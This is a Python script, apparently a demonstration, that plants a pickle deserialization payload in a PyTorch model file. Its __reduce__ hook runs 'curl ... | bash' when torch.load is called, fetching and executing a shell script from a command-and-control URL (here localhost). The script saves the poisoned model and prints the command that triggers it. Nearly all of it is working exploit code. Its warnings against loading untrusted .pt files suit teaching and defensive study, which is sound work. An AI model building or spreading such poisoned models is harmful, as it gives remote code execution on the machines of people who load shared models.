#!/usr/bin/env python3
"""
Pickle Attack Script - Demonstrates PyTorch Model Poisoning
=============================================================
This script injects a malicious payload into a PyTorch model file.
The payload executes arbitrary code during model deserialization (torch.load).

Usage:
    python3 attack.py

Input:  models/small_model.pt (normal model)
Output: malicious_model.pt (poisoned model)
"""

import torch
import pickle
import os


# ============================================================================
# Configuration
# ============================================================================

INPUT_MODEL = 'models/small_model.pt'
ATTACK_DIR = 'models_attack'
OUTPUT_MODEL = 'models_attack/small_normal_malicious.pt'


# ============================================================================
# Malicious Payload
# ============================================================================

class MaliciousPayload:
    """
    Malicious payload that executes during pickle unpickling.

    When torch.load() deserializes this object, __reduce__() is automatically
    called, which executes the specified command.
    """
    def __reduce__(self):
        # This code runs automatically during unpickling!
        # Downloads and executes attack_demo.sh from HTTPS CNC server
        import os
        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))


# ============================================================================
# Attack Implementation
# ============================================================================

def create_malicious_model():
    """Inject malicious payload into normal model"""

    print("=" * 70)
    print("[ATTACK] Creating Malicious PyTorch Model")
    print("=" * 70)

    # Create attack directory if it doesn't exist
    os.makedirs(ATTACK_DIR, exist_ok=True)

    # Step 1: Load normal model
    if not os.path.exists(INPUT_MODEL):
        print(f"\n[ERROR] Input model not found: {INPUT_MODEL}")
        print(f"Please ensure the model file exists before running this script.")
        return False

    print(f"\n[1/3] Loading normal model: {INPUT_MODEL}")
    model = torch.load(INPUT_MODEL, weights_only=False)

    input_size = os.path.getsize(INPUT_MODEL)
    print(f"   ✓ Model loaded successfully")
    print(f"   ✓ Original size: {input_size / (1024*1024):.2f} MB ({input_size:,} bytes)")

    # Step 2: Inject malicious payload
    print(f"\n[2/3] Injecting malicious payload...")
    print(f"   ⚠ Payload: MaliciousPayload class with __reduce__() hook")
    print(f"   ⚠ Action: Downloads and executes attack_demo.sh on load")

    # Add malicious object to model
    if isinstance(model, dict):
        model['__malicious_payload__'] = MaliciousPayload()
    else:
        model = {
            'original_model': model,
            '__malicious_payload__': MaliciousPayload()
        }

    print(f"   ✓ Payload injected successfully")

    # Step 3: Save poisoned model
    print(f"\n[3/3] Saving malicious model: {OUTPUT_MODEL}")
    torch.save(model, OUTPUT_MODEL)

    output_size = os.path.getsize(OUTPUT_MODEL)
    overhead = output_size - input_size

    print(f"   ✓ Malicious model saved successfully")
    print(f"   ✓ Output size: {output_size / (1024*1024):.2f} MB ({output_size:,} bytes)")
    print(f"   ✓ Payload overhead: {overhead / 1024:.2f} KB ({overhead:,} bytes)")

    # Summary
    print("\n" + "=" * 70)
    print("[SUCCESS] Attack Preparation Complete!")
    print("=" * 70)
    print(f"\nMalicious model created: {OUTPUT_MODEL}")
    print(f"\n⚠ WARNING: Loading this model with torch.load() will:")
    print(f"   1. Automatically trigger __reduce__() during unpickling")
    print(f"   2. Execute: curl -k -s https://localhost:8888/attack_demo.sh | bash")
    print(f"   3. Download and run arbitrary code from HTTPS CNC server")
    print(f"\n💡 This demonstrates the pickle deserialization vulnerability!")
    print(f"   Never load untrusted .pt files without verification!")
    print("=" * 70)

    return True


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    success = create_malicious_model()

    if success:
        print(f"\n[NEXT STEP] Test the attack:")
        print(f"   python3 -c 'import torch; torch.load(\"{OUTPUT_MODEL}\", weights_only=False)'")
        print(f"\n   This will trigger the malicious payload!")

    exit(0 if success else 1)
